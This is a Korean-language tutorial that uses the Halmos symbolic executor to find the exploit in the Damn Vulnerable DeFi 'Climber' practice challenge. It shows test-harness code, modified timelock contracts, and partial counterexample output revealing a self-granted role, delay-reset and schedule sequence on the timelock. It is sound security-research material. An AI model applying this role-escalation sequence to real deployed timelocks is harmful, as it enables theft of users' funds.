# Halmos vs Climber

## Halmos 버전
이 글에서는 halmos 0.2.4가 사용되었습니다.

## 서문
독자는 다음 문제를 해결하는 이전 글들에 익숙하다고 강력하게 가정합니다:
1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)
5. [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder)
6. [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie)
7. [Backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/backdoor)

주요 아이디어들이 여기서 대부분 반복되므로 다시 다루지 않을 것입니다.

## 준비
### 공통 필수 조건
1. **Climber.t.sol** 파일을 **ClimberHalmos.t.sol**로 복사합니다.
2. `test_climber()`의 이름을 `check_climber()`로 변경하여 Halmos가 이 테스트를 심볼릭하게 실행하도록 합니다.
3. `makeAddr()` 치트코드 사용을 피하십시오:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    address proposer = address(0xcafe0003);
    address sweeper = address(0xcafe0004);
    ```
4. **GlobalStorage**를 생성하고 계약의 주소-이름 쌍을 저장합니다. `vault`의 경우, 구현(implementation)이 별도의 계약임을 잊지 마십시오:
    ```solidity
    function get_ERC1967Proxy_implementation(address proxy) public view 
                                            returns (address impl){
        // Check vault implementation immutability
        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; // implementation slot
        bytes32 result = _vm.load(address(proxy), slot);
        impl = address(uint160(uint256(result)));
        return impl;
    }
    ```
    ```solidity
    ...
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(vault), "ERC1967Proxy");
        glob.add_addr_name_pair(glob.get_ERC1967Proxy_implementation(address(vault)), "ClimberVault");
        glob.add_addr_name_pair(address(timelock), "ClimberTimelock");
        glob.add_addr_name_pair(address(token), "DamnValuableToken");
        ...
    }
    ```
5. 모든 계약 주소를 출력합니다:
    ```solidity
    function check_climber() public checkSolvedByPlayer {
        SymbolicAttacker attacker = new SymbolicAttacker();
        console.log("GlobalStorage\t", address(glob));
        console.log("ClimberVaultProxy\t", address(vault));
        console.log("ClimberVaultImpl\t", glob.get_ERC1967Proxy_implementation(address(vault)));
        console.log("ClimberTimelock\t", address(timelock));
        console.log("token\t\t", address(token));
        console.log("GlobalStorage\t", address(attacker));
        ...
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_climber --loop 100
    ...
    [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] ClimberVaultProxy  0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] ClimberVaultImpl   0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] ClimberTimelock    0x00000000000000000000000000000000000000000000000000000000aaaa0005
    [console.log] DamnValuableToken  0x00000000000000000000000000000000000000000000000000000000aaaa0006
    [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0007
    ```

### _isSolved() 구현
원래 확인 로직은 다음과 같습니다:
```solidity
function _isSolved() private view {
    assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
    assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
}
```
우리는 타겟 계약들의 예기치 않은 동작을 달성하는 데 도움이 될 수 있는 불변 조건들을 생각해 내기 시작합니다:
1. 가장 명백한 것은 `vault`의 잔액을 어떻게든 줄일 수 있는지 확인하는 것입니다:
    ```solidity
    assert (token.balanceOf(address(vault)) >= VAULT_TOKEN_BALANCE);
    ```
2. 전통적인 `allowance` 확인도 여기에 포함됩니다:
    ```solidity
    // Check allowance changes
    address symbolicSpender = svm.createAddress("symbolicSpender");
    assert (token.allowance(address(vault), symbolicSpender) == 0);
    ```
3. `vault` 계약에는 `sweeper`와 `owner`라는 2개의 흥미로운 역할이 있습니다. 본질적으로 이것들은 변경 가능한 `address` 타입의 변수일 뿐입니다:
    ```solidity
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }
    ```
    ```solidity
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        OwnableStorage storage $ = _getOwnableStorage();
        return $._owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }
    ```
    이것을 어떻게든 변경할 수 있는지 확인해 봅시다:
    ```solidity
    // Check vault roles immutability:
    assert(vault.getSweeper() == sweeper);
    assert(vault.owner() == address(timelock));
    ```
5. 설정의 `vault`는 본질적으로 **UUPS** 프록시 계약이므로, 이 프록시의 **구현(implementation)** 자체를 어떤 방식으로든 조작할 수 없는지 확인할 수 있습니다:
    ```solidity
    // Check vault implementation immutability
    assert(glob.get_ERC1967Proxy_implementation(address(vault)) == address(0xaaaa0003));
    ```
6. `timelock` 또한 역할 시스템을 가지고 있지만 `vault`와는 약간 다릅니다. 주요 차이점은 여러 주소가 동일한 역할을 가질 수 있다는 것입니다:
   ```solidity
   import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
   
   abstract contract ClimberTimelockBase is AccessControl {
   ...
   }
   ```
   ```solidity
   contract ClimberTimelock is ClimberTimelockBase {
   ...
       constructor(address admin, address proposer) {
        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);

        _grantRole(ADMIN_ROLE, admin);
        _grantRole(ADMIN_ROLE, address(this)); // self administration
        _grantRole(PROPOSER_ROLE, proposer);

        delay = 1 hours;
        is_preload = true;
    }
   ...
   }
   ```
   우리는 `PROPOSER`와 `ADMIN` 역할에 관심이 있습니다.

   따라서, 이전에 `timelock`에서 역할을 갖지 않았던 누군가에게 새로운 역할을 부여할 수 있는지 확인해 봅시다:
    ```solidity
    // Check timelock roles immutability
    address symbolicProposer = svm.createAddress("symbolicProposer");
    vm.assume(symbolicProposer != proposer);
    assert(!timelock.hasRole(PROPOSER_ROLE, symbolicProposer));

    address symbolicAdmin = svm.createAddress("symbolicAdmin");
    vm.assume(symbolicAdmin != deployer);
    vm.assume(symbolicAdmin != address(timelock));
    assert(!timelock.hasRole(ADMIN_ROLE, symbolicAdmin));
    ```

## 커버리지 개선
### SymbolicAttacker 콜백 처리
지금까지 우리는 타겟 계약이 **SymbolicAttacker**에게 심볼릭 `call`을 다시 하는 시나리오를 기본적으로 고려하지 않았습니다. 하지만 [side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/side-entrance/README.md#callbacks), [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/selfie/README.md#onflashloan) 및 [backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/backdoor/README.md#delegatecall) 챌린지의 예에서 알 수 있듯이, 이것은 공격자가 제어하는 계약으로 제어권이 다시 넘어가는 꽤 일반적인 시나리오입니다.

따라서 이제 **SymbolicAttacker**에 특별한 `fallback()`을 추가하여 다른 계약으로부터의 호출을 처리할 수 있도록 하겠습니다:
```solidity
bool reent_guard = false;

fallback() external payable {
    vm.assume(reent_guard == false);
    reent_guard = true;
    console.log("inside fallback");
    bytes4 selector = svm.createBytes4("fallback_selector");
    vm.assume(selector == bytes4(msg.data));
    execute_tx("fallback_target");
    bytes memory retdata = svm.createBytes(1000, "fallback_retdata");// something should be returned
    reent_guard = false;
    assembly {
        return(add(retdata, 0x20), mload(retdata))
    }
}
```
이제 다른 계약들이 이 `fallback()`을 호출할 수 있도록 **GlobalStorage**에 기능을 추가해 봅시다:
```solidity
//SymbolicAttacker address
address attacker;
...
function set_attacker_addr(address addr) public {
    _vm.assume(attacker == address(0x0));
    attacker = addr;
}
...
function get_concrete_from_symbolic_optimized (address /*symbolic*/ addr) public 
                                        returns (address ret, bytes memory data) 
{
    bytes4 selector = _svm.createBytes4("selector");
    ...
     _vm.assume(attacker != address(0x0));
    if (addr == attacker)
    {
        data = _svm.createBytes(1000, "attacker_fallback_bytes");
        _vm.assume(selector == bytes4(data));
        _vm.assume(selector == bytes4(keccak256("attacker_fallback_selector()")));
    }
    _vm.assume(false); // Ignore cases when addr is not some concrete known address
}
```
그래서, `check_climber()`:
```solidity
function check_climber() public checkSolvedByPlayer {
    SymbolicAttacker attacker = new SymbolicAttacker();
    glob.set_attacker_addr(address(attacker));
    ...
}
```

### 프록시 구현 처리
새로운 것을 좀 더 자세히 살펴봅시다. 이 챌린지에서 우리는 **ERC1967Proxy**를 통해 구현된 업그레이드 가능한 계약을 처음으로 봅니다:
```solidity
// Deploy the vault behind a proxy,
// passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
vault = ClimberVault(
    address(
        new ERC1967Proxy(
            address(new ClimberVault()), // implementation
            abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
        )
    )
);
```
따라서 우리는 2개의 인터페이스를 동시에 구현하는 계약을 가지고 있습니다: **ERC1967Proxy** 자체와 그 **구현(implementation)** 계약 인터페이스입니다. 상기시켜 드리자면, 우리는 **GlobalStorage**에 각 주소에 대해 하나의 인터페이스 이름만 저장하므로, 현재로서는 이러한 프록시에 대해 두 인터페이스의 함수를 모두 심볼릭하게 실행할 메커니즘이 없습니다.

한 가지 우아한 아이디어는 두 인터페이스를 모두 상속하는 단일 **SuperInterface**를 만드는 것입니다. 그리고 "**SuperInterface**"를 계약 이름으로 **GlobalStorage**에 전달합니다:
```solidity
interface SuperInterface is ERC1967Proxy, ClimberVault {}
...
glob.add_addr_name_pair(address(vault), "SuperInterface");
```
그러나 이 접근 방식에는 문제가 있습니다. 업그레이드 가능한 계약은 **구현**을 변경할 수 있으므로, 잠재적인 **구현** 계약 변경 후에는 그러한 **SuperInterface**가 이 프록시에 대해 더 이상 유효하지 않게 됩니다.

따라서, 우리는 이 문제에 대해 다소 복잡하지만 더 보편적인 해결책을 가질 것입니다:
```solidity
function get_addr_data_selector(address /*symbolic*/ addr) private view
{
    ...
    for (uint256 i = 0; i < addresses_list_size; i++) {
            if (addresses[i] == addr) {
                string memory name = names_by_addr[addresses[i]];
                ret = addresses[i];
                // Proxy contracts could be accessed by 2 interfaces: ERC1967Proxy itself 
                // and its implementation contract
                if (keccak256(bytes(name)) == keccak256(bytes("ERC1967Proxy"))) {
                    bool is_implementation = _svm.createBool("is_implementation");
                    if (is_implementation) {
                        address imp = get_ERC1967Proxy_implementation(addresses[i]);
                        name = names_by_addr[imp];
                    }
                } 
                data = _svm.createCalldata(name);
                _vm.assume(selector == bytes4(data));
                return (ret, data, selector);
            }
    ...
}
```
이제 심볼릭 트랜잭션 무차별 대입의 전체 기능입니다:
```solidity
/*
** if addr is a concrete value, this returns (addr, symbolic calldata for addr)
** if addr is symbolic, execution will split for each feasible case and it will return
**      (addr0, symbolic calldata for addr0), (addr1, symbolic calldata for addr1),
        ..., and so on (one pair per path)
** if addr is symbolic but has only 1 feasible value (e.g. with vm.assume(addr == ...)),
        then it should behave like the concrete case
*/
    function get_addr_data_selector(address /*symbolic*/ addr) private view
                                    returns (address ret, bytes memory data, bytes4 selector)
    {
        selector = _svm.createBytes4("selector");
        for (uint256 i = 0; i < addresses_list_size; i++) {
            if (addresses[i] == addr) {
                string memory name = names_by_addr[addresses[i]];
                ret = addresses[i];
                /*
                * "is_implementation"이라는 심볼릭 불리언 변수를 사용하여 Halmos가 프록시 자체의 인터페이스가 사용되는 경우와
                * 구현의 인터페이스가 사용되는 경우의 2가지 사례를 별도로 고려하도록 강제합니다.
                */
                if (keccak256(bytes(name)) == keccak256(bytes("ERC1967Proxy"))) {
                    bool is_implementation = _svm.createBool("is_implementation");
                    if (is_implementation) {
                        address imp = get_ERC1967Proxy_implementation(addresses[i]);
                        name = names_by_addr[imp];
                    }
                } 
                data = _svm.createCalldata(name);
                _vm.assume(selector == bytes4(data));
                return (ret, data, selector);
            }
        }
        _vm.assume(attacker != address(0x0));
        if (addr == attacker)
        {
            data = _svm.createBytes(1000, "attacker_fallback_bytes");
            _vm.assume(bytes4(data) == bytes4(keccak256("attacker_fallback_selector()")));
            return (attacker, data, selector);
        }
        _vm.assume(false); // Ignore cases when addr is not some concrete known address
    }

    function get_concrete_from_symbolic (address /*symbolic*/ addr) public view 
                                        returns (address ret, bytes memory data) 
    {
        bytes4 selector;
        (ret, data, selector) = get_addr_data_selector(addr);
    }

    /*
    ** This function has the same purpose as get_concrete_from_symbolic,
    ** but applies optimizations and heuristics.
    */
    function get_concrete_from_symbolic_optimized (address /*symbolic*/ addr) public
                                        returns (address ret, bytes memory data) 
    {
        bytes4 selector;
        (ret, data, selector) = get_addr_data_selector(addr);

        for (uint256 s = 0; s < banned_selectors_size; s++) {
            _vm.assume(selector != banned_selectors[s]);
        }
        for (uint256 s = 0; s < used_selectors_size; s++) {
            _vm.assume(selector != used_selectors[s]);
        }
        used_selectors[used_selectors_size] = selector;
        used_selectors_size++;
    }
```

### 심볼릭 오프셋
**ClimberTimelock**의 다음 두 함수를 살펴봅시다:
```solidity
function schedule(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) external onlyRole(PROPOSER_ROLE) {
...
}

/**
* Anyone can execute what's been scheduled via `schedule`
*/
function execute(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt)
    external payable
{
...
}
```
우리는 전달된 인수로 `bytes[] calldata dataElements`가 사용되는 것을 즉시 알아차립니다. 이것은 이미 심볼릭 오프셋 오류로 이어지는 "고전적인" 패턴입니다. 따라서 언제나 그렇듯이, 우리는 내부적으로 심볼릭 바이트를 직접 생성하고 원래 바이트 사용을 우리가 생성한 것으로 대체합니다.

하지만 이러한 대체로 넘어가기 전에, 로컬 `operation` 등록 시스템에 대해 이야기할 가치가 있습니다. 우리는 이미 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#executeaction)에서 스케줄된 `actions` 기능을 접했습니다. 거기서는 각 `action`에 순서대로 번호가 부여되었습니다. 하지만 "Climber"는 다른 시스템을 사용합니다: 우리는 먼저 `schedule()`에 `targets`, `values`, `bytes`, `salt`의 배열을 전달해야 합니다. 이 모든 것이 연결되고 해시됩니다:
```solidity
function getOperationId(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) public pure returns (bytes32) {
    return keccak256(abi.encode(targets, values, dataElements, salt));
}
```
이 해시는 새로 등록된 작업의 `id`입니다:
```solidity
bytes32 id = getOperationId(targets, values, dataElements, salt);
...
operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
operations[id].known = true;
```
그런 다음, 이 `action`을 실행하려면, `schedule()`에서와 똑같은 매개변수를 `execute()`에 **바이트 단위로** 전달해야 합니다(이것이 중요합니다). 왜냐하면 여기서 해시가 다시 취해지고 `id`가 계산되며, 이를 기반으로 이 작업이 등록되었는지 여부가 명확해지기 때문입니다:
```solidity
function getOperationState(bytes32 id) public view returns (OperationState state) {
    Operation memory op = operations[id];

    if (op.known) {
        if (op.executed) {
            state = OperationState.Executed;
        } else if (block.timestamp < op.readyAtTimestamp) {
            state = OperationState.Scheduled;
        } else {
            state = OperationState.ReadyForExecution;
        }
    } else {
        state = OperationState.Unknown;
    }
}
```
```solidity
bytes32 id = getOperationId(targets, values, dataElements, salt);
...
if (getOperationState(id) != OperationState.ReadyForExecution) {
    revert NotReadyForExecution(id);
}
```
우리가 어떻게든 `operation`을 등록할 방법을 찾는다고 해도(상기시키자면: `attacker`는 `admin`도 `proposer`도 아닙니다), 심볼릭 실행을 위한 테스트를 적절하게 준비하기 위해 여전히 두 가지 조건을 충족해야 합니다:
1. `execute()`에서 심볼릭 오프셋 오류를 우회합니다. 이에 대한 "해독제"는 `createCalldata()` 치트코드를 사용하여 `dataElements[]`를 대체하는 것입니다.
2. `schedule()`의 `dataElements[]` 바이트는 `createCalldata()`가 아닌 `createBytes()` 치트코드를 통해 대체되어야 합니다. 이것이 더 정확해 보이기 때문입니다: 우리는 여기에 말 그대로 어떤 바이트든 전달할 수 있습니다. 이것은 특히 업그레이드 가능한 프록시가 있는 설정에서 사실입니다(현재 **구현**에서 아직 지원되지 않지만 언젠가 지원될 프록시에 대한 `operation`을 생성하는 것을 막는 것은 없습니다). 그리고 `createCalldata()`를 사용하면 이러한 바이트가 될 수 있는 것에 제한을 둡니다. 물론 이 의견은 논쟁의 여지가 있을 수 있습니다.

`schedule()`과 `execute()`에서 서로 다른 치트코드를 사용하면 `id`를 찾는 로직에 나쁜 영향을 미칠 수 있습니다. 사실 `createCalldata()`에 의해 생성된 바이트는 완전히 다른 길이가 될 수 있는 반면, `createBytes()`는 생성된 심볼릭 바이트의 수를 명확하게 지정해야 합니다("초과" 바이트는 패딩으로 `0s`로 대체됨).

이제 `operation`을 올바르게 스케줄하고 실행하려면 두 함수의 매개변수의 동일성을 보존해야 한다는 것을 기억해 봅시다. 따라서 우리는 `execute()`에 전달한 `operation`이 스케줄되었다는 것을 단순히 증명할 수 없을 것입니다. 우리는 해결해야 할 특이한 문제에 직면했습니다.

### 단순화된 검증
다음은 이 문제를 해결할 수 있는 몇 가지 아이디어입니다:
1. `createCalldata()`의 심볼릭 바이트를 수정하여 정적 크기를 가지고 끝에 패딩으로 `0s`를 출력하도록 합니다(이에 대해서는 나중에 자세히 설명).
2. 잠재적인 프록시 **구현** 변경 상황을 별도로 처리합니다.
3. `operations` 기능 자체를 리팩토링하여 심볼릭 분석에 더 "친화적"으로 만듭니다([backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/backdoor#ownerisnotabeneficiary-issue)의 심볼릭 매핑 키에 "안녕"하세요).

이들 모두 존재할 권리가 있으며 잠재적으로 이 문제를 해결하는 데 사용될 수 있습니다. 그러나 `id` 계산 원리를 약간 변경하는 것이 더 쉽습니다: 전체 바이트 배열을 연결하는 대신 각 바이트 배열의 함수 선택자(selector)만 연결해 볼 수 있습니다. 이 선택자는 항상 `4` 바이트의 정적 크기이므로, `execute()`에서 그러한 주소 집합과 해당 함수가 등록되었는지 확인할 수 있습니다(이러한 함수에 대한 특정 매개변수 없이). 물론 우리는 검증의 단순화가 잘못된 반례로 이어질 수 있다는 점을 고려합니다. 하지만 제 생각에 이것은 수익성 있는 절충안이 될 것입니다.

그게 다입니다. 필요한 주제를 논의했습니다. 구현해 봅시다:
```solidity
abstract contract ClimberTimelockBase is AccessControl {
...
function getOperationId(
    address[] memory targets,
    uint256[] memory values,
    bytes4[] memory dataElementsSelectors, // Replaced bytes[] by bytes4[] here
    bytes32 salt
) public pure returns (bytes32) {
    return keccak256(abi.encode(targets, values, dataElementsSelectors, salt));
}
```
```solidity
contract ClimberTimelock is ClimberTimelockBase, FoundryCheats, HalmosCheats {
...
function schedule(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) external onlyRole(PROPOSER_ROLE) {
    if (targets.length == MIN_TARGETS || targets.length >= MAX_TARGETS) {
        revert InvalidTargetsCount();
    }

    if (targets.length != values.length) {
        revert InvalidValuesCount();
    }

    if (targets.length != dataElements.length) {
        revert InvalidDataElementsCount();
    }

    address[] memory _targets = new address[](targets.length);
    uint256[] memory _values = new uint256[](values.length);
    bytes4[] memory _dataElementsSelectors = new bytes4[](dataElements.length);
    bytes32 _salt = _svm.createBytes32("schedule_salt");
    for (uint8 i = 0; i < targets.length; i++) {
        _targets[i] = _svm.createAddress("schedule_target");
        _values[i] = _svm.createUint256("schedule_value");
        _dataElementsSelectors[i] = _svm.createBytes4("schedule_selector");
    }

    bytes32 id = getOperationId(_targets, _values, _dataElementsSelectors, _salt);
    console.logBytes32(id);

    if (getOperationState(id) != OperationState.Unknown) {
        revert OperationAlreadyKnown(id);
    }

    operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
    operations[id].known = true;
}

/**
 * Anyone can execute what's been scheduled via `schedule`
 */
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
    if (targets.length <= MIN_TARGETS) {
        revert InvalidTargetsCount();
    }

    if (targets.length != values.length) {
        revert InvalidValuesCount();
    }

    if (targets.length != dataElements.length) {
        revert InvalidDataElementsCount();
    }

    address[] memory _targets = new address[](targets.length);
    uint256[] memory _values = new uint256[](values.length);
    bytes[] memory _dataElements = new bytes[](dataElements.length);
    bytes4[] memory _dataElementsSelectors = new bytes4[](dataElements.length);
    bytes32 _salt = _svm.createBytes32("execute_salt");
    for (uint8 i = 0; i < targets.length; i++) {
        _targets[i] = _svm.createAddress("execute_target");
        _values[i] = _svm.createUint256("execute_value");
        (_targets[i], _dataElements[i]) = glob.get_concrete_from_symbolic_optimized(_targets[i]);
        _dataElementsSelectors[i] = _svm.createBytes4("execute_selector");
        _vm.assume(_dataElementsSelectors[i] == bytes4( _dataElements[i]));
    }

    bytes32 id = getOperationId(_targets, _values, _dataElementsSelectors, _salt);

    for (uint8 i = 0; i < targets.length; ++i) {
        uint snap0 = _vm.snapshotState(); // Optimization by snapshot
        _targets[i].functionCallWithValue(_dataElements[i], _values[i]);
        uint snap1 = _vm.snapshotState();
        _vm.assume(snap0 != snap1);
    }

    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```
### `createCalldata()` 바이트를 위한 패딩
이 하위 섹션은 전체 기사를 검토한 후 작성되었습니다. [karmacoma](https://github.com/0xkarmacoma)는 `createCalldata()`를 통해 생성된 바이트에 패딩을 추가하는 것이 문제를 우회하는 그렇게 복잡한 방법이 아니라고 제안했습니다. 사실, 우리는 `execute()`와 `schedule()` 모두에서 사용될 충분히 큰 바이트 배열 크기만 선택하면 됩니다(저는 `2048`을 선택했습니다).

`schedule()`에서는 `dataElements`를 대체하기 위해 `createBytes()`를 사용할 것입니다:
```solidity
function schedule(
...
{
    ...
    address[] memory _targets = new address[](targets.length);
    uint256[] memory _values = new uint256[](values.length);
    bytes[] memory _dataElements = new bytes[](dataElements.length);
    bytes32 _salt = _svm.createBytes32("schedule_salt");
    for (uint8 i = 0; i < targets.length; i++) {
        _targets[i] = _svm.createAddress("schedule_target");
        _values[i] = _svm.createUint256("schedule_value");
        _dataElements[i] = _svm.createBytes(2048, "schedule_dataElement");
    }

    bytes32 id = getOperationId(_targets, _values, _dataElements, _salt);
    ...
}
```
`execute()`에서는 동적으로 `padding` 크기를 계산하고 `createCalldata()`에서 가져온 결과와 연결합니다:
```solidity
function execute(
...
{
    ...
    address[] memory _targets = new address[](targets.length);
    uint256[] memory _values = new uint256[](values.length);
    bytes[] memory _dataElements = new bytes[](dataElements.length);
    bytes32 _salt = _svm.createBytes32("execute_salt");
    for (uint8 i = 0; i < targets.length; i++) {
        bytes memory cdata;
        _targets[i] = _svm.createAddress("execute_target");
        _values[i] = _svm.createUint256("execute_value");
        (_targets[i], cdata) = glob.get_concrete_from_symbolic_optimized(_targets[i]);
        bytes memory padding = new bytes(2048 - cdata.length);
        _dataElements[i] = bytes.concat(cdata, padding);
    }

    bytes32 id = getOperationId(_targets, _values, _dataElements, _salt);
    ...
}
```
이제 단순화된 `id`를 통한 접근 방식과 `padding`을 통한 접근 방식 두 가지를 병렬로 고려할 것입니다. 그런 다음 결과를 비교할 것입니다.

## 심볼릭 트랜잭션 수 확장
### 확장할 곳
하나의 심볼릭 공격 트랜잭션이 있는 설정에서는 Halmos가 반례를 찾지 못했습니다. 따라서 우리는 심볼릭 공격 트랜잭션의 수를 늘리는 일반적인 확장을 수행합니다. [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#expand-onflashloan)에서 알 수 있듯이, `SymbolicAttacker::attack()`만이 심볼릭 트랜잭션의 수를 확장할 수 있는 유일한 곳은 아닙니다. 현재 설정에는 확장이 가능한 곳이 적어도 3곳 있습니다:
1. 실제로 `SymbolicAttacker::attack()`:
    ```solidity
    function attack() public {
        vm.assume(msg.sender == address(0xcafe0001)); // Only player can execute it
        execute_tx("attack_target");
    }
    ```
2. `SymbolicAttacker::fallback()`:
    ```solidity
    fallback() external payable {
        ...
        execute_tx("fallback_target");
        ...
    }
    ```
3. `ClimberTimelock::execute()`에 전달되는 트랜잭션 수 증가:
    ```solidity
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable
    {
    ```
    Halmos에 `--default-array-lengths 3` 매개변수를 전달하여 이를 수행할 수 있습니다(기본값은 `0, 1, 2`).

우리는 이 방법들을 하나씩 시도해 볼 수밖에 없습니다:

1. 
    ```solidity
    function attack() public {
        vm.assume(msg.sender == address(0xcafe0001)); // Only player can execute it
        execute_tx("attack_target1");
        execute_tx("attack_target2");
    }
    ```
    `attack()`에 하나의 트랜잭션을 추가해도 아무런 효과가 없었습니다: 아직 반례가 발견되지 않았습니다.
2. `fallback()` 확장의 경우도 마찬가지입니다:
    ```solidity
    fallback() external payable {
        ...
        execute_tx("fallback_target1");
        execute_tx("fallback_target2");
        ...
    }
    ```
3. 하지만 `execute()`의 함수 수를 늘리면 매우 흥미로운 결과가 나왔습니다. 먼저 단순화된 `id` 접근 방식의 결과입니다:
    ```javascript
    halmos --solver-timeout-assertion 0 --function check_climber --loop 100  --default-array-lengths 3 --solver-timeout-branching 0
    ...
    Counterexample:
        halmos_attack_target_address_2b26674_01 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_salt_bytes32_aeae062_44 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_selector_bytes4_10ce5fe_134 = updateDelay
        halmos_execute_selector_bytes4_1645f73_89 = grantRole
        halmos_execute_selector_bytes4_8dd39aa_179 = schedule
        halmos_execute_target_address_85344a4_135 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_target_address_9aac6c2_90 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_target_address_df8939d_45 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_value_uint256_59c9434_46 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_value_uint256_76d9b17_91 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_value_uint256_be6fe48_136 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_salt_bytes32_2de977f_180 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_selector_bytes4_76b87f6_189 = schedule
        halmos_schedule_selector_bytes4_79d11c7_186 = updateDelay
        halmos_schedule_selector_bytes4_e3c43da_183 = grantRole
        halmos_schedule_target_address_01c0fa0_184 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_target_address_7f47fc1_187 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_target_address_be00243_181 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_value_uint256_1a85646_185 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_value_uint256_9c79e34_182 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_value_uint256_a21a79e_188 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_selector_bytes4_4da5861_47 = grantRole
        halmos_selector_bytes4_9c02733_02 = execute
        halmos_selector_bytes4_9e9a490_92 = updateDelay
        halmos_selector_bytes4_e8b0dd5_137 = schedule
        halmos_symbolicProposer_address_c37dd86_191 = 0x00000000000000000000000000000000aaaa0005
        halmos_symbolicSpender_address_758d16e_190 = 0x0000000000000000000000000000000000000000
        p_account_address_ffb2231_67 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
        p_dataElements_length_8a0edaf_170 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_dataElements_length_e275aaa_13 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_newDelay_uint64_48ccc1d_133 = 0x0000000000000000000000000000000000000000000000000000000000000000
        p_role_bytes32_8629c87_66 = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1
        p_targets_length_09055e1_162 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_targets_length_baf4649_05 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_values_length_627b85a_166 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_values_length_fb84b24_09 = 0x0000000000000000000000000000000000000000000000000000000000000003
    ```
    그리고 두 번째 반례입니다:
    ```javascript
    Counterexample:
        halmos_attack_target_address_2b26674_01 = 0x00000000000000000000000000000000aaaa0005
        halmos_attacker_fallback_bytes_bytes_303e2ea_138 = 0xfe96ffd0...00
        halmos_execute_salt_bytes32_aeae062_44 = 0x0000000000000000000000000000000000000000000000000000000000000001
        halmos_execute_selector_bytes4_10ce5fe_134 = updateDelay
        halmos_execute_selector_bytes4_1645f73_89 = grantRole
        halmos_execute_selector_bytes4_ead1bb5_139 = 0xfe96ffd0
        halmos_execute_target_address_85344a4_135 = 0x00000000000000000000000000000000aaaa0007
        halmos_execute_target_address_9aac6c2_90 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_target_address_df8939d_45 = 0x00000000000000000000000000000000aaaa0005
